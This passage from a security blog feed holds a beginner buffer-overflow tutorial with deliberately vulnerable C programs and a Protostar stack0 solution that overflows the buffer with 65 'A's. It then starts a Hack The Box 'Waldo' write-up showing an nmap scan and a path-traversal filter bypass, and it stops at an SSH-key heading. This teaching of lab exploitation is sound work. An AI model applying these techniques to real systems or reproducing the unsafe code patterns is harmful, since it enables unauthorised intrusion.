&lt;h4 id=&quot;the-rest-of-the-code-takes-the-user-input-then-prints-it&quot;&gt;The rest of the code takes the user input then prints it.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;Enter your name: &quot;);&lt;/code&gt; 
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, username);&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;Hello %s\n, username&quot;);&lt;/code&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-when-we-compile-and-run-this-program-we-get-the-output-as-expected-right-&quot;&gt;So when we compile and run this program we get the output as expected right ?&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-before-we-talk-about-the-buffer-overflow-we-need-to-understand-how-the-application-memory-works&quot;&gt;Now before we talk about the buffer overflow we need to understand how the application memory works&lt;/h4&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;application-memory--stack-and-memory-addresses&quot;&gt;Application Memory , Stack and Memory Addresses&lt;/h2&gt;
&lt;h4 id=&quot;so-how-does-the-application-memory-look-like-and-whats-a-stack--a-stack-is-a-memory-buffer-that-is-used-to-store-the-functions-of-the-program-and-local-variables-to-demonstrate-this-we-will-take-a-look-at-this-image&quot;&gt;So how does the application memory look like and what’s a stack ? A stack is a memory buffer that is used to store the functions of the program and local variables. To demonstrate this, we will take a look at this image.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;first-we-have-the-code-and-this-is-the-source-code-of-the-program-this-has-the-main-instructions-of-the-program&quot;&gt;First We have the code and this is the source code of the program. This has the main instructions of the program.&lt;/h4&gt;
&lt;h4 id=&quot;after-that-we-have-the-buffer-where-the-global-variables-are-stored&quot;&gt;After that we have the buffer where the global variables are stored,&lt;/h4&gt;
&lt;h4 id=&quot;the-difference-between-a-local-variable-and-a-global-variable-is-that-a-local-variable-is-limited-to-a-certain-function-its-defined-in-that-function-and-can-be-only-called-in-that-function-but-a-global-variable-is-either-defined-in-the-main-function-or-defined-outside-a-function-and-this-type-of-variables-can-be-called-anywhere&quot;&gt;&lt;em&gt;The difference between a local variable and a global variable is that a local variable is limited to a certain function. It’s defined in that function and can be only called in that function but a global variable is either defined in the main function or defined outside a function and this type of variables can be called anywhere&lt;/em&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;then-we-have-the-stack-and-this-is-the-important-part-of-the-memory-for-us-because-this-is-where-the-buffer-overflow-happens-this-is-the-place-where-local-variable-and-function-calls-are-stored&quot;&gt;Then we have the Stack and this is the important part of the memory for us because this is where the buffer overflow happens. This is the place where local variable and function calls are stored.&lt;/h4&gt;
&lt;h4 id=&quot;last-thing-is-heap-and-this-is-a-dynamic-memory-allocation&quot;&gt;Last thing is Heap and this is a dynamic memory allocation.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-know-what-does-the-application-memory-look-like-and-what-is-the-stack-but-what-are-memory-addresses-&quot;&gt;Now we know what does the application memory look like and what is the stack but what are memory addresses ?&lt;/h4&gt;
&lt;h4 id=&quot;basically-when-a-program-is-compiled-and-executed--all-the-instructions-of-the-program-take-place-in-the-application-memory-and-an-address-is-assigned-to-them--this-address-is-usually-in-the-format-of-hexadecimal-bytes&quot;&gt;Basically when a program is compiled and executed , All the instructions of the program take place in the application memory and an address is assigned to them , This address is usually in the format of hexadecimal bytes.&lt;/h4&gt;
&lt;h4 id=&quot;so-if-you-disassemble-a-program-and-look-at-it-youll-find-the-memory-addresses--something-like-this-&quot;&gt;So if you disassemble a program and look at it you’ll find the memory addresses , something like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;why-do-buffer-overflows-happen-&quot;&gt;Why Do Buffer Overflows Happen ?&lt;/h2&gt;
&lt;h4 id=&quot;now-we-know-what-is-a-buffer-and-we-took-a-deeper-look-on-the-memory-construction-now-you-might-already-figured-out-why-and-when-does-a-buffer-overflow-happen-a-buffer-overflow-happens-when-the-length-of-the-data-entered-exceeds-the-buffer-limit-and-this-causes-the-program-to-write-data-outside-the-allocated-buffer-area-and-may-overwrite-some-parts-of-the-memory-that-were-used-to-hold-data-used-by-the-program-which-makes-it-unavailable-and-causes-the-program-to-crash-to-demonstrate-this-we-will-go-back-to-our-first-example&quot;&gt;Now we know what is a buffer and we took a deeper look on the memory construction. Now you might already figured out why and when does a buffer overflow happen. A buffer overflow happens when the length of the data entered exceeds the buffer limit and this causes the program to write data outside the allocated buffer area and may overwrite some parts of the memory that were used to hold data used by the program which makes it unavailable and causes the program to crash. To demonstrate this we will go back to our first example.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main () {
   char username[20];

   printf(&quot;Enter your name: &quot;);
   scanf(&quot;%s&quot;, username);

   printf(&quot;Hello %s\n&quot;, username);
   printf(&quot;Program exited normally&quot;);
   return(0);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-will-add-a-last-line-to-print-the-sentence-program-exited-noramlly-just-for-demonstration-purposes&quot;&gt;We will add a last line to print the sentence “program exited noramlly” just for demonstration purposes&lt;/h4&gt;
&lt;h4 id=&quot;now-the-program-should-ask-us-for-username-then-print-hello-username-then-print-program-exited-normally-and-exits-the-buffer-for-holding-the-username-value-is-set-to-20-chars--its-good-as-long-as-the-username-length-is-less-than-20-chars-but-if-the-entered-data-is-more-than-20-chars-length-the-program-will-crash-because-some-data-will-be-overwritten-outside-the-buffer-causing-some-parts-of-the-program-to-be-corrupted-in-our-case-this-will-be-the-part-which-prints-program-exited-normally&quot;&gt;Now the program should ask us for username then print “Hello &lt;em&gt;username&lt;/em&gt;” then print “program exited normally” and exits. The buffer for holding the username value is set to 20 chars , it’s good as long as the username length is less than 20 chars. But if the entered data is more than 20 chars length the program will crash because some data will be overwritten outside the buffer causing some parts of the program to be corrupted. in our case this will be the part which prints “program exited normally”&lt;/h4&gt;
&lt;h4 id=&quot;first-lets-run-the-program-and-enter-the-name-as-rick&quot;&gt;First let’s run the program and enter the name as Rick&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-program-exits-normally&quot;&gt;The program exits normally.&lt;/h4&gt;
&lt;h4 id=&quot;now-lets-run-it-again-and-enter-the-name-as-30-as&quot;&gt;Now let’s run it again and enter the name as 30 A’s&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-hello-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-printed-then-we-dont-see-program-exited-normally-and-we-get-a-segmentation-fault-error-that-happened-because-we-entered-10-extra-chars-the-program-only-expected-20-or-less-those-extra-aaaaaaaaaa-exceeded-the-20-chars-buffer-and-overwrited-other-data-the-print-instruction-which-prints-program-exited-normally-which-caused-a-segmentation-fault-because-the-program-is-corrupted&quot;&gt;We get “Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA” printed then we don’t see “program exited normally” and we get a segmentation fault error. That happened because we entered 10 extra chars, The program only expected 20 or less. Those extra “AAAAAAAAAA” exceeded the 20 chars buffer and overwrited other data (The print instruction which prints “program exited normally”) which caused a segmentation fault because the program is corrupted.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;examining-buffer-overflows-with-gdb&quot;&gt;Examining Buffer Overflows with gdb&lt;/h2&gt;
&lt;h4 id=&quot;lets-take-a-deeper-look-at-how-this-is-happening-with-gdb-gnu-debugger&quot;&gt;Let’s take a deeper look at how this is happening with gdb (gnu debugger).&lt;/h4&gt;
&lt;h4 id=&quot;we-will-write-another-program-that-creates-a-variable-called-whatever-then-it-copies-what-we-give-it-and-put-it-in-that-variable-and-we-will-assign-the-buffer-for-that-variable-to-be-20&quot;&gt;We will write another program that creates a variable called “whatever” then it copies what we give it and put it in that variable. And we will assign the buffer for that variable to be 20&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char** argv)
{
	char whatever[20];
	strcpy(whatever, argv[1]);

	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;breakdown&quot;&gt;Breakdown&lt;/h3&gt;
&lt;h4 id=&quot;int-mainint-argc-char-argv-this-defines-the-main-function-and-its-arguments&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int main(int argc, char** argv)&lt;/code&gt; This defines the main function and it’s arguments&lt;/h4&gt;
&lt;h4 id=&quot;char-whatever20-this-creates-the-variable-and-gives-it-the-name-whatever-and-assigns-its-buffer-to-20&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;char whatever[20];&lt;/code&gt; This creates the variable and gives it the name “whatever” and assigns its buffer to 20&lt;/h4&gt;
&lt;h4 id=&quot;strcpywhatever-argv1-this-copies-our-input-and-puts-it-into-our-variable-whatever&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strcpy(whatever, argv[1]);&lt;/code&gt; This copies our input and puts it into our variable “whatever”&lt;/h4&gt;
&lt;h4 id=&quot;return-0-and-this-is-our-return-address&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;return 0;&lt;/code&gt; And this is our return address&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-lets-run-the-program-inside-gdb-and-test-it&quot;&gt;Now let’s run the program inside gdb and test it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-input-was-aaaaa-which-is-less-than-20-chars-so-the-program-exited-normally-and-everything-is-good&quot;&gt;The input was aaaaa which is less than 20 chars so the program exited normally and everything is good&lt;/h4&gt;
&lt;h4 id=&quot;now-lets-throw-an-input-more-that-20-chars&quot;&gt;Now let’s throw an input more that 20 chars.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-a-segmentation-fault-because-our-return-address-is-overwritten-and-the-program-couldnt-continue&quot;&gt;We get a segmentation fault because our return address is overwritten and the program couldn’t continue.&lt;/h4&gt;
&lt;h4 id=&quot;to-show-how-are-these-addresses-overwritten-lets-input-any-hex-value--something-like-x12-for-50-times-then-lets-look-at-the-registers&quot;&gt;To show how are these addresses overwritten let’s input any hex value , something like \x12 for 50 times. Then let’s look at the registers.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-that-most-of-the-memory-addresses-are-overwritten-with-12&quot;&gt;We see that most of the memory addresses are overwritten with 12&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;why-are-buffer-overflows-dangerous-&quot;&gt;Why Are Buffer Overflows Dangerous ?&lt;/h2&gt;
&lt;h4 id=&quot;now-you-might-ask-yourself--how-will-that-be-harmful-&quot;&gt;Now you might ask yourself , How will that be harmful ?&lt;/h4&gt;
&lt;h4 id=&quot;a-buffer-overflow-is-dangerous-when-the-vulnerable-binary-or-program-is-a-setuid-binary--if-you-dont-know-what-setuid-binaries-are-read-the-provided-link-but-in-general-they-are-programs-that-run-with-capabilities-of-another-user-usually-root--but-when-that-program-is-vulnerable-to-a-buffer-overflow-its-not-a-good-thing-anymore-since-we-can-pass-the-buffer-and-overwrite-the-program-then-we-can-overwrite-it-with-a-payload-that-executes-a-system-call-and-spawns-a-root-shell&quot;&gt;A buffer overflow is dangerous when the vulnerable binary or program is a &lt;a href=&quot;https://en.wikipedia.org/wiki/Setuid&quot;&gt;setuid&lt;/a&gt; binary , If you don’t know what setuid binaries are, read the provided link, but in general They are programs that run with capabilities of another user (usually root) , But when that program is vulnerable to a buffer overflow it’s not a good thing anymore. Since we can pass the buffer and overwrite the program then we can overwrite it with a payload that executes a system call and spawns a root shell&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;i-will-do-more-write-ups-about-buffer-overflows-and-other-binary-exploitation-techniques-for-now-i-will-start-with-protostar&quot;&gt;I will do more write ups about buffer overflows and other binary exploitation techniques, for now I will start with protostar.&lt;/h4&gt;
&lt;h4 id=&quot;there-are-also-some-cool-boxes-on-hack-the-box-that-required-buffer-overflows-and-binary-exploitation-to-gain-root-privileges-but-theyre-active-right-now-so-ill-publish-my-write-ups-about-these-boxes-as-soon-as-they-retire-of-course-in-the-meantime-you-can-read-my-other-hack-the-box-write-ups-&quot;&gt;There are also some cool boxes on Hack The box that required buffer overflows and binary exploitation to gain root privileges but they’re active right now so I’ll publish my write ups about these boxes as soon as they retire of course. In the meantime, you can read my other &lt;a href=&quot;https://0xrick.github.io&quot;&gt;Hack The Box write-ups&lt;/a&gt; !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;protostar-stack0&quot;&gt;Protostar Stack0&lt;/h2&gt;
&lt;h4 id=&quot;now-lets-do-a-simple-practical-example&quot;&gt;Now let’s do a simple practical example.&lt;/h4&gt;
&lt;h4 id=&quot;you-can-download-protostar-from-here&quot;&gt;You can download protostar from &lt;a href=&quot;https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-will-solve-the-first-level-which-is-stack0-for-this-article-then-i-will-solve-the-rest-of-the-levels-in-other-write-ups&quot;&gt;I will solve the first level which is stack0 for this article then I will solve the rest of the levels in other write-ups.&lt;/h4&gt;
&lt;h4 id=&quot;were-given-the-source-code-of-the-program-&quot;&gt;We’re given the source code of the program :&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 modified = 0;
 gets(buffer);

 if(modified != 0) {
  printf(&quot;you have changed the 'modified' variable\n&quot;);
 } else {
  printf(&quot;Try again?\n&quot;);
 }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;from-the-code-we-can-understand-that-the-program-has-a-variable-called-buffer-and-assigns-a-buffer-of-64-chars-to-it-then-theres-another-variable-called-modified-and-its-value-is-0-getsbuffer-allows-us-to-input-the-value-of-buffer-variablethen-theres-an-if-statement-that-checks-if-the-value-of-modified-variable-is-not-equal-to-0-if-its-not-equal-to-zero-it-will-print-you-have-changed-the-modified-variable-but-if-its-still-equal-to-0-it-will-print-try-again-so-our-mission-is-to-change-the-value-of-that-variable-called-modified&quot;&gt;From the code we can understand that the program has a variable called “buffer” and assigns a buffer of 64 chars to it. Then there’s another variable called modified and it’s value is 0. gets(buffer) allows us to input the value of “buffer” variable.Then there’s an if statement that checks if the value of “modified” variable is not equal to 0. If it’s not equal to zero it will print “you have changed the ‘modified’ variable” but if it’s still equal to 0 it will print “Try again?”. So our mission is to change the value of that variable called “modified”&lt;/h4&gt;
&lt;h4 id=&quot;as-long-as-the-entered-data-is-less-than-64-chars-everything-will-run-as-intended-but-if-the-input-exceeds-the-buffer-it-will-overwrite-the-value-of-modified-variable&quot;&gt;As long as the entered data is less than 64 chars everything will run as intended. But if the input exceeds the buffer it will overwrite the value of “modified” variable.&lt;/h4&gt;
&lt;h4 id=&quot;we-already-know-that-the-buffer-is-64-chars-so-we-just-need-to-input-65-chars-or-more-and-the-variable-value-will-change-lets-test-that-out&quot;&gt;We already know that the buffer is 64 chars so we just need to input 65 chars or more and the variable value will change. Let’s test that out.&lt;/h4&gt;
&lt;h4 id=&quot;we-execute-the-stack0-bin-and-we-see-the-output-try-again&quot;&gt;We execute the stack0 bin and we see the output “try again?”&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-throw-65-as-and-see-the-output&quot;&gt;Let’s throw 65 “A”s and see the output.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print ('A' * 65)&quot; | ./stack0 &lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-have-successfuly-overwritten-the-variables-value--d&quot;&gt;And we have successfuly overwritten the variable’s value ! :D&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated&quot;&gt;That’s it , Feedback is appreciated.&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading-&quot;&gt;Thanks for reading !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction So first of all I know that there are many tutorials published about buffer overflow and binary exploitation but I decided to write this article because most of these tutorials and articles don’t really talk about the basic fundmentals needed to understand what a buffer overflow really is. They just go explaining what’s a buffer overflow without explaining what is a buffer , what is a stack or what are memory addresses etc. And I just wanted to make it easier for someone who wants to learn about it to find an article that covers the basics. So what I’m going to talk about in this article is what is a buffer , what is a stack and what are the memory addresses and we will take a look at the application memory structure , what is a buffer overflow and why does it happen then I’ll show a really basic and simple example for exploiting a buffer overflow (protostar stack0) Buffer So what’s a buffer ? Simply a buffer is a memory place or location which is used by a running program. This memory location is used to store some temporary data that is being used by the program. So for example if we have a simple program that asks the user to enter his name and stores it in a variable called username then it prints “Hello username “ . For example if we run the program and enter username as “Rick”. The word “Rick” is stored in the buffer until the program executes the print command and it retrieves the given username “Rick” from the buffer to output the result : “Hello Rick” Our example written in c will be like this #include &amp;lt;stdio.h&amp;gt; int main () { char username[20]; printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, username); printf(&quot;Hello %s\n&quot;, username); return(0); } Break Down int main() This defines the main function char username[20] This is where we specify the variable name but the most important thing about this line is char .... [20] this is where we specify the buffer for that variable , and i assigned it as 20 chars The rest of the code takes the user input then prints it. printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, username); printf(&quot;Hello %s\n, username&quot;); So when we compile and run this program we get the output as expected right ? Now before we talk about the buffer overflow we need to understand how the application memory works Application Memory , Stack and Memory Addresses So how does the application memory look like and what’s a stack ? A stack is a memory buffer that is used to store the functions of the program and local variables. To demonstrate this, we will take a look at this image. First We have the code and this is the source code of the program. This has the main instructions of the program. After that we have the buffer where the global variables are stored, The difference between a local variable and a global variable is that a local variable is limited to a certain function. It’s defined in that function and can be only called in that function but a global variable is either defined in the main function or defined outside a function and this type of variables can be called anywhere. Then we have the Stack and this is the important part of the memory for us because this is where the buffer overflow happens. This is the place where local variable and function calls are stored. Last thing is Heap and this is a dynamic memory allocation. Now we know what does the application memory look like and what is the stack but what are memory addresses ? Basically when a program is compiled and executed , All the instructions of the program take place in the application memory and an address is assigned to them , This address is usually in the format of hexadecimal bytes. So if you disassemble a program and look at it you’ll find the memory addresses , something like this : Why Do Buffer Overflows Happen ? Now we know what is a buffer and we took a deeper look on the memory construction. Now you might already figured out why and when does a buffer overflow happen. A buffer overflow happens when the length of the data entered exceeds the buffer limit and this causes the program to write data outside the allocated buffer area and may overwrite some parts of the memory that were used to hold data used by the program which makes it unavailable and causes the program to crash. To demonstrate this we will go back to our first example. #include &amp;lt;stdio.h&amp;gt; int main () { char username[20]; printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, username); printf(&quot;Hello %s\n&quot;, username); printf(&quot;Program exited normally&quot;); return(0); } We will add a last line to print the sentence “program exited noramlly” just for demonstration purposes Now the program should ask us for username then print “Hello username” then print “program exited normally” and exits. The buffer for holding the username value is set to 20 chars , it’s good as long as the username length is less than 20 chars. But if the entered data is more than 20 chars length the program will crash because some data will be overwritten outside the buffer causing some parts of the program to be corrupted. in our case this will be the part which prints “program exited normally” First let’s run the program and enter the name as Rick The program exits normally. Now let’s run it again and enter the name as 30 A’s We get “Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA” printed then we don’t see “program exited normally” and we get a segmentation fault error. That happened because we entered 10 extra chars, The program only expected 20 or less. Those extra “AAAAAAAAAA” exceeded the 20 chars buffer and overwrited other data (The print instruction which prints “program exited normally”) which caused a segmentation fault because the program is corrupted. Examining Buffer Overflows with gdb Let’s take a deeper look at how this is happening with gdb (gnu debugger). We will write another program that creates a variable called “whatever” then it copies what we give it and put it in that variable. And we will assign the buffer for that variable to be 20 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char** argv) { char whatever[20]; strcpy(whatever, argv[1]); return 0; } Breakdown int main(int argc, char** argv) This defines the main function and it’s arguments char whatever[20]; This creates the variable and gives it the name “whatever” and assigns its buffer to 20 strcpy(whatever, argv[1]); This copies our input and puts it into our variable “whatever” return 0; And this is our return address Now let’s run the program inside gdb and test it. The input was aaaaa which is less than 20 chars so the program exited normally and everything is good Now let’s throw an input more that 20 chars. We get a segmentation fault because our return address is overwritten and the program couldn’t continue. To show how are these addresses overwritten let’s input any hex value , something like \x12 for 50 times. Then let’s look at the registers. We see that most of the memory addresses are overwritten with 12 Why Are Buffer Overflows Dangerous ? Now you might ask yourself , How will that be harmful ? A buffer overflow is dangerous when the vulnerable binary or program is a setuid binary , If you don’t know what setuid binaries are, read the provided link, but in general They are programs that run with capabilities of another user (usually root) , But when that program is vulnerable to a buffer overflow it’s not a good thing anymore. Since we can pass the buffer and overwrite the program then we can overwrite it with a payload that executes a system call and spawns a root shell I will do more write ups about buffer overflows and other binary exploitation techniques, for now I will start with protostar. There are also some cool boxes on Hack The box that required buffer overflows and binary exploitation to gain root privileges but they’re active right now so I’ll publish my write ups about these boxes as soon as they retire of course. In the meantime, you can read my other Hack The Box write-ups ! Protostar Stack0 Now let’s do a simple practical example. You can download protostar from here I will solve the first level which is stack0 for this article then I will solve the rest of the levels in other write-ups. We’re given the source code of the program : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&quot;you have changed the 'modified' variable\n&quot;); } else { printf(&quot;Try again?\n&quot;); } } From the code we can understand that the program has a variable called “buffer” and assigns a buffer of 64 chars to it. Then there’s another variable called modified and it’s value is 0. gets(buffer) allows us to input the value of “buffer” variable.Then there’s an if statement that checks if the value of “modified” variable is not equal to 0. If it’s not equal to zero it will print “you have changed the ‘modified’ variable” but if it’s still equal to 0 it will print “Try again?”. So our mission is to change the value of that variable called “modified” As long as the entered data is less than 64 chars everything will run as intended. But if the input exceeds the buffer it will overwrite the value of “modified” variable. We already know that the buffer is 64 chars so we just need to input 65 chars or more and the variable value will change. Let’s test that out. We execute the stack0 bin and we see the output “try again?” Let’s throw 65 “A”s and see the output. python -c &quot;print ('A' * 65)&quot; | ./stack0 And we have successfuly overwritten the variable’s value ! :D That’s it , Feedback is appreciated. Thanks for reading !</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF/0.png" /></entry><entry><title type="html">Hack The Box - Waldo</title><link href="http://localhost:4000/hack-the-box/waldo/" rel="alternate" type="text/html" title="Hack The Box - Waldo" /><published>2018-12-15T00:00:00+02:00</published><updated>2018-12-15T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/waldo</id><content type="html" xml:base="http://localhost:4000/hack-the-box/waldo/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;waldo-was-a-great-box-and-what-makes-it-special-is-its-unique-way-in-getting-the-root-flag-every-step-with-this-box-was-very-fun-and-i-liked-this-box-too-much&quot;&gt;Waldo was a great box and what makes it special is its unique way in getting the root flag. Every step with this box was very fun and I liked this box too much.&lt;/h4&gt;
&lt;h4 id=&quot;its-a-linux-box-and-its-ip-is-10101087-so-lets-jump-right-in&quot;&gt;It’s a linux box and its ip is 10.10.10.87 so let’s jump right in&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/0.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;starting-with-nmap-to-scan-for-open-tcp-ports-and-services&quot;&gt;Starting with nmap to scan for open TCP ports and services.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT 10.10.10.87 &lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/waldo/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-only-see-http-on-port-80-and-ssh-on-port-22&quot;&gt;We only see http on port 80 and ssh on port 22.&lt;/h4&gt;
&lt;h4 id=&quot;on-port-80-theres-a-web-application-called-list-manager&quot;&gt;On port 80 there’s a web application called List Manager.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;path-traversal&quot;&gt;Path Traversal&lt;/h3&gt;
&lt;h4 id=&quot;we-will-intercept-the-traffic-with-burp-then-we-will-start-to-perform-actions-on-the-application-like-creating-a-list--editing-it--deleteing-it-etc&quot;&gt;We will intercept the traffic with Burp then we will start to perform actions on the application like creating a list , editing it , deleteing it etc..&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-looking-at-the-requests-we-will-find-two-interesting-requests&quot;&gt;By looking at the requests we will find two interesting requests.&lt;/h4&gt;
&lt;h4 id=&quot;the-post-request-to-filereadphp-and-the-post-request-to-dirreadphp&quot;&gt;The POST request to fileRead.php and the POST request to dirRead.php.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-send-them-to-the-repeater-and-play-with-them&quot;&gt;Let’s send them to the repeater and play with them.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-notice-that-dirreadphp-lists-the-contents-of-a-directory-by-giving-the-path-in-a-post-request-so-we-might-have-a-path-traversal-vulnerability-here&quot;&gt;We will notice that dirRead.php lists the contents of a directory by giving the path in a POST request so we might have a path traversal vulnerability here.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-tried-to-go-up-one-directory-it-works&quot;&gt;If we tried to go up one directory it works&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/4.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-going-up-2-directories-doesnt-work-so-there-might-be-a-filter-that-prevents-that&quot;&gt;But going up 2 directories doesn’t work so there might be a filter that prevents that.&lt;/h4&gt;
&lt;h4 id=&quot;we-can-try-to-bypass-the-filter-by-adding-another--and-it-worked&quot;&gt;We can try to bypass the filter by adding another &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt;. And it worked&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/6.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-key-for-monitor&quot;&gt;SSH key for monitor&lt;/h3&gt;
